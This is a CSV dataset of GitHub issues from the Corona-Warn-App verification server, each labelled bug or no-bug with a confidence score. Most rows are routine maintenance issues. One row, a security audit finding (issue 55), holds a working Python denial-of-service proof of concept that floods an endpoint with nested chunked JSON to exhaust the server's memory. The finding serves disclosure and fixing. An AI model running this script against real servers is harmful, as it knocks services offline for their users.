issue_no,repo,issue_url,title,description,patched_file_types,text_for_topic_modeling,prediction,confidence
33,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/33,[BSI][0.3.1-alpha] Fields in Request Body not Checked,"Rating: Informational Description: Many of the PostMapping functions do not verify the structure of the request bodies before trying to access fields within the JSON data. In case a specific field is not present, the getter functions return Null which leads to NullPointerExceptions when further processing these values. Proof of Concept: [verification_fields_not_checked.txt](https://github.com/corona-warn-app/cwa-verification-server/files/4671782/verification_fields_not_checked.txt)",source-file | test-file | test-file | config-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | test-file | config-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | test-file,"[BSI][0.3.1-alpha] Fields in Request Body not Checked Rating: Informational Description: Many of the PostMapping functions do not verify the structure of the request bodies before trying to access fields within the JSON data. In case a specific field is not present, the getter functions return Null which leads to NullPointerExceptions when further processing these values. Proof of Concept: [verification_fields_not_checked.txt](https://github.com/corona-warn-app/cwa-verification-server/files/4671782/verification_fields_not_checked.txt) source-file test-file test-file config-file source-file source-file source-file source-file source-file source-file source-file source-file source-file test-file test-file config-file source-file source-file source-file source-file source-file source-file source-file source-file source-file test-file test-file",bug,0.9
126,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/126,"Codespell report for ""cwa-verification-server"" (on fossies.org)","Similar to the description in the issue [cwa-app-ios#149](https://github.com/corona-warn-app/cwa-app-ios/issues/149) there exists on [fossies.org](https://fossies.org) also a regularly updated [codespell](https://github.com/codespell-project/codespell) [report](https://fossies.org/features.html#codespell) for ""cwa-verification-server"": &nbsp;&nbsp;https://fossies.org/linux/test/cwa-verification-server-master.tar.gz/codespell.html",documentation-file | source-file | source-file | source-file | config-file | test-file | test-file | documentation-file | source-file | source-file | source-file | config-file | test-file | test-file | documentation-file | documentation-file,"Codespell report for ""cwa-verification-server"" (on fossies.org) Similar to the description in the issue [cwa-app-ios#149](https://github.com/corona-warn-app/cwa-app-ios/issues/149) there exists on [fossies.org](https://fossies.org) also a regularly updated [codespell](https://github.com/codespell-project/codespell) [report](https://fossies.org/features.html#codespell) for ""cwa-verification-server"": &nbsp;&nbsp;https://fossies.org/linux/test/cwa-verification-server-master.tar.gz/codespell.html documentation-file source-file source-file source-file config-file test-file test-file documentation-file source-file source-file source-file config-file test-file test-file documentation-file documentation-file",no-bug,0.95
162,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/162,Old io.jsonwebtoken Maven dependency,"<!-- Thanks for submitting your question! Before opening a new issue, please make sure that we do not have any duplicates already open. You can ensure this by searching the issue list for this repository. If there is a duplicate, please close your issue and add a comment to the existing issue instead. Also, please, have a look at our FAQs and existing questions before opening a new question. --> ## Why do you use old io.jsonwebtoken maven repo <!-- Include details about your question. --> The developers of this Java Package provided an instruction on GitHub where they explained for installation you have to add ""jjwt-api"", ""jjwt-impl"" and ""jjwt-jackson"" or ""-gson"" to your pom.xml because these are updated. And the repo which is used in this repo(""jjwt"") is very old since 2018 it hasn't been updated. I recommend using the new packages.  but it could be that it makes no sense for you to use the new repos due to the compatibility with your project which is why I did not create a pull-request. * Source File: pom.xml * Line(s): 139-143 * Question: Why do you use old io.jsonwebtoken maven repo?",config-file | source-file | test-file | test-file,"Old io.jsonwebtoken Maven dependency <!-- Thanks for submitting your question! Before opening a new issue, please make sure that we do not have any duplicates already open. You can ensure this by searching the issue list for this repository. If there is a duplicate, please close your issue and add a comment to the existing issue instead. Also, please, have a look at our FAQs and existing questions before opening a new question. --> ## Why do you use old io.jsonwebtoken maven repo <!-- Include details about your question. --> The developers of this Java Package provided an instruction on GitHub where they explained for installation you have to add ""jjwt-api"", ""jjwt-impl"" and ""jjwt-jackson"" or ""-gson"" to your pom.xml because these are updated. And the repo which is used in this repo(""jjwt"") is very old since 2018 it hasn't been updated. I recommend using the new packages.  but it could be that it makes no sense for you to use the new repos due to the compatibility with your project which is why I did not create a pull-request. * Source File: pom.xml * Line(s): 139-143 * Question: Why do you use old io.jsonwebtoken maven repo? config-file source-file test-file test-file",no-bug,0.95
62,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/62,Remove @author tags,"## Current Implementation Currently the javadoc class comments contain a `@author T-Systems International GmbH` tag, which doesn't add any information and is just additional clutter. ## Suggested Enhancement Remove the tags. ## Expected Benefits Let author information be handled by git, which does a much better job than a generic tag. Also there's already an [CODEOWNERS](https://github.com/corona-warn-app/cwa-verification-server/blob/master/CODEOWNERS) file.",source-file | source-file | source-file | source-file,"Remove @author tags ## Current Implementation Currently the javadoc class comments contain a `@author T-Systems International GmbH` tag, which doesn't add any information and is just additional clutter. ## Suggested Enhancement Remove the tags. ## Expected Benefits Let author information be handled by git, which does a much better job than a generic tag. Also there's already an [CODEOWNERS](https://github.com/corona-warn-app/cwa-verification-server/blob/master/CODEOWNERS) file. source-file source-file source-file source-file",no-bug,0.95
107,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/107,Unnecessary complexity,## Current Implementation * Source File: VerificationController.java * Line(s): 225-229 if ((appSession.get().getHashedGuid() == null) && (appSession.get().getTeleTanHash() != null)) { return ResponseEntity.ok(new TestResult(LabTestResult.POSITIVE.getTestResult(; } String hash = appSession.get().getHashedGuid() != null ? appSession.get().getHashedGuid() : appSession.get().getTeleTanHash(); ## Suggested Enhancement \ | GUIDhash NULL | GUIDhash Not Null  | |  TeleTANHash Null | 229 hash = TeleTanHash = Null | 229 hash = GUID-Hash TeleTANHash Not Null | Return 226 | 229 hash = GUIDHash 229 should read ? appSession.get().getHashedGuid() : null; as an alternative one should instead check for the AppSessionSourceOfTrust as a selection mechanism - preferable everywhere where this is done by GUIDHash our TeleTanHash comparisons with null. And it would be useful to implement custom setter and getters for hashed_guid and teleTanHash in VerificationAppSession. In these a verification should take place that the hashed value and the sourceOfTrust are consistent. ## Expected Benefits Code is more transparent,documentation-file | source-file | source-file | source-file | test-file | test-file | test-file | test-file | test-file,Unnecessary complexity ## Current Implementation * Source File: VerificationController.java * Line(s): 225-229 if ((appSession.get().getHashedGuid() == null) && (appSession.get().getTeleTanHash() != null)) { return ResponseEntity.ok(new TestResult(LabTestResult.POSITIVE.getTestResult(; } String hash = appSession.get().getHashedGuid() != null ? appSession.get().getHashedGuid() : appSession.get().getTeleTanHash(); ## Suggested Enhancement \ | GUIDhash NULL | GUIDhash Not Null  | |  TeleTANHash Null | 229 hash = TeleTanHash = Null | 229 hash = GUID-Hash TeleTANHash Not Null | Return 226 | 229 hash = GUIDHash 229 should read ? appSession.get().getHashedGuid() : null; as an alternative one should instead check for the AppSessionSourceOfTrust as a selection mechanism - preferable everywhere where this is done by GUIDHash our TeleTanHash comparisons with null. And it would be useful to implement custom setter and getters for hashed_guid and teleTanHash in VerificationAppSession. In these a verification should take place that the hashed value and the sourceOfTrust are consistent. ## Expected Benefits Code is more transparent documentation-file source-file source-file source-file test-file test-file test-file test-file test-file,no-bug,0.9
226,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/226,Add timestamp to test result,"## Current Implementation Test representation as hash and test result are fetched from test result server. ## Suggested Enhancement Add a timestamp when the test result is confirmed. This timestamp can be considered as confirmation time of the test.  Interface The existing REST payload shall be enhanced by a key `""sc"": number` containing the time of confirmation in UNIX epoch format. This value is optional, i. e, upon creation time the mobile client may not set this value. As long the test result is pending, the value will not be included, when requested via `/version/v1/testresult` ## Expected Benefits All Tests PCR and RAG Tests shall contain the timestamp. Concerning PCR Tests this timestamp is currently the time, the result arrives at the server.",config-file | test-file | test-file | source-file | test-file | test-file | test-file,"Add timestamp to test result ## Current Implementation Test representation as hash and test result are fetched from test result server. ## Suggested Enhancement Add a timestamp when the test result is confirmed. This timestamp can be considered as confirmation time of the test.  Interface The existing REST payload shall be enhanced by a key `""sc"": number` containing the time of confirmation in UNIX epoch format. This value is optional, i. e, upon creation time the mobile client may not set this value. As long the test result is pending, the value will not be included, when requested via `/version/v1/testresult` ## Expected Benefits All Tests PCR and RAG Tests shall contain the timestamp. Concerning PCR Tests this timestamp is currently the time, the result arrives at the server. config-file test-file test-file source-file test-file test-file test-file",no-bug,0.9
88,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/88,Use configuration classes instead of @Value annotations,"## Current Implementation Configuration values are injected via `@Value`. ## Suggested Enhancement Implement a ConfigurationService. See https://github.com/corona-warn-app/cwa-server/issues/183 ## Expected Benefits * central configration definition for better maintainability * fast failure on startup, if non-optional values are missing. * ability to use primitive values instead of wrapper types without higher chance of accidental default value usage (see #86)",source-file | source-file | source-file | source-file | other-file | source-file | source-file | source-file | source-file,"Use configuration classes instead of @Value annotations ## Current Implementation Configuration values are injected via `@Value`. ## Suggested Enhancement Implement a ConfigurationService. See https://github.com/corona-warn-app/cwa-server/issues/183 ## Expected Benefits * central configration definition for better maintainability * fast failure on startup, if non-optional values are missing. * ability to use primitive values instead of wrapper types without higher chance of accidental default value usage (see #86) source-file source-file source-file source-file other-file source-file source-file source-file source-file",no-bug,0.9
55,cwa-verification-server,https://github.com/corona-warn-app/cwa-verification-server/issues/55,[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion,"Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {"""": we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: python import socket, sys if len(sys.argv) != 3: print (""usage %s target [size in MB]"" % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = ""POST /version/v1/registrationToken HTTP/1.1\r\n"" hdr += ""Host: ""+sys.argv[1]+"":8080\r\n"" hdr += ""Content-Type: application/json\r\n"" hdr += ""Transfer-Encoding: Chunked\r\n"" hdr += ""\r\n"" s.send(hdr) chunk = '{"""":'*256*1024 # we create lots of nested dicts chunk = ""%x\r\n%s\r\n"" % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(""\rSent %d MB"" % i) print(""\nDone"") #raw_input() ",source-file | config-file | source-file | source-file | config-file | test-file | test-file | test-file,"[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {"""": we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: python import socket, sys if len(sys.argv) != 3: print (""usage %s target [size in MB]"" % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = ""POST /version/v1/registrationToken HTTP/1.1\r\n"" hdr += ""Host: ""+sys.argv[1]+"":8080\r\n"" hdr += ""Content-Type: application/json\r\n"" hdr += ""Transfer-Encoding: Chunked\r\n"" hdr += ""\r\n"" s.send(hdr) chunk = '{"""":'*256*1024 # we create lots of nested dicts chunk = ""%x\r\n%s\r\n"" % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(""\rSent %d MB"" % i) print(""\nDone"") #raw_input()  source-file config-file source-file source-file config-file test-file test-file test-file",bug,0.85
